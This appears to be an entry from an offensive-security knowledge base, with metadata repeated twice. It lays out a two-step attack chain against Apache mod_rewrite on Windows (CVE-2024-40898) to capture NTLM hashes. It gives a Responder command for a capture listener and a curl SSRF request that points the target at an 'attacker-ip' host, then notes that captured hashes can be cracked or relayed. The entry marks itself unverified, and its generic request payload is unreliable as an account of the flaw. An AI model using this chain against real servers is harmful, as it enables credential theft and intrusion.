---
tags:
  - ssrf
  - ntlm
  - apache
  - mod_rewrite
  - windows
  - credential-access
type: attack_chain
tools:
  - '[[tools/Responder]]'
tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
verified: false
platforms:
  - Windows
  - Web
submitted: true
complexity: medium
created_at: '2024-10-01T00:00:00Z'
procedures:
  - '[[procedures/Set-Up-NTLM-Capture-Server]]'
  - '[[procedures/Exploit-Apache-mod_rewrite-SSRF]]'
step_count: 2
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Adversary-in-the-Middle]]'
updated_at: '2025-12-14T04:09:00.608Z'
description: >-
  Multi-stage attack exploiting SSRF in Apache HTTP Server's mod_rewrite on
  Windows to force NTLM authentication and capture hashes from a malicious
  server.
skill_level: intermediate
impact_level: high
id: e1564cc8-4826-40d9-aa72-f408a9a2f890
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Adversary-in-the-Middle]]'
---
---
name: SSRF via Apache mod_rewrite to Leak NTLM Hashes on Windows
type: attack_chain
description: "Multi-stage attack exploiting SSRF in Apache HTTP Server's mod_rewrite on Windows to force NTLM authentication and capture hashes from a malicious server."
verified: false
submitted: false
step_count: 2
created_at: 2024-10-01T00:00:00Z
updated_at: 2024-10-01T00:00:00Z
procedures: [[procedures/Set-Up-NTLM-Capture-Server]], [[procedures/Exploit-Apache-mod_rewrite-SSRF]]
techniques: [[Exploit Public-Facing Application]], [[Adversary-in-the-Middle]]
tactics: [[Initial Access]], [[Credential Access]]
tags: ssrf, ntlm, apache, mod_rewrite, windows, credential-access
platforms: Windows, Web
tools: [[tools/Responder]]
complexity: medium
skill_level: intermediate
impact_level: high
---

# SSRF via Apache mod_rewrite to Leak NTLM Hashes on Windows

Multi-stage attack chain demonstrating a complete attack workflow exploiting CVE-2024-40898 in Apache HTTP Server on Windows.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Set Up Malicious Server] --> B[Trigger SSRF Request]
    B --> C[Capture NTLM Hash]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Responder]]
- curl (standard HTTP client)

### Target Environment

- Apache HTTP Server on Windows with mod_rewrite enabled in server or vhost context
- Vulnerable version affected by CVE-2024-40898
- Network access to the Apache server from attacker's position
- Attacker controls a server reachable via SSRF (e.g., public IP for HTTP/SMB)

### Initial Access Requirements

- No prior credentials needed; exploits public-facing Apache server
- Attacker must be able to send HTTP requests to the target
- Target must be on Windows to trigger NTLM auth leakage

## Detailed Attack Procedures

### Step 1: Set Up NTLM Capture Server
procedure: [[procedures/Set-Up-NTLM-Capture-Server]]

**Objective**: Deploy a malicious server to listen for and capture NTLM authentication attempts triggered by the SSRF.

**Instructions**: Use [[tools/Responder]] to set up a poisoner and listener for NTLM hashes on the attacker's server. Ensure the server is accessible via the protocol that will trigger NTLM (e.g., HTTP or SMB).

Run the Responder tool to start capturing:

```bash
responder -I eth0 -w -r -f
```

**Expected Output**: Responder starts listening on interfaces, ready to capture NTLM challenges.

**Success Indicators**:
- Responder logs show listening on ports (e.g., 445 for SMB, 80/139 for HTTP)
- No errors in setup

### Step 2: Trigger SSRF and Capture Hash
procedure: [[procedures/Exploit-Apache-mod_rewrite-SSRF]]

**Objective**: Send a crafted HTTP request to the Apache server that exploits mod_rewrite SSRF, forcing it to connect to the attacker's server and authenticate with NTLM, leaking the hash.

**Instructions**: Identify the vulnerable endpoint (e.g., a URL where mod_rewrite rules can be influenced). Use [[commands/curl-send-ssrf-request]] to send a request that rewrites to the attacker's server URL, triggering internal connection and NTLM auth.

```bash
curl -X GET "http://target-apache.com/vulnerable-endpoint?redirect=http://attacker-ip:80/evil" -H "Host: target-apache.com"
```

Monitor the Responder logs for incoming NTLM auth attempt.

**Expected Output**: Apache processes the request, SSRF triggers connection to attacker-ip, and Responder captures the NTLM hash in logs.

**Success Indicators**:
- HTTP response from Apache (may be 200 or error, but SSRF occurs)
- Responder shows captured NTLMv2 hash (e.g., "NTLMv2-SSP Hash: ...")
- Hash can be cracked or relayed for further access

## Attack Chain Summary

### Key Achievements

1. Forced the Windows Apache server to authenticate to attacker's controlled server via SSRF.
2. Captured NTLM hashes for potential relay attacks or cracking.
3. Gained insights into internal network credentials without direct access.

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Adversary-in-the-Middle]] Adversary-in-the-Middle

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Credential Access]] Credential Access

---
*Last updated: 2024-10-01T00:00:00Z*
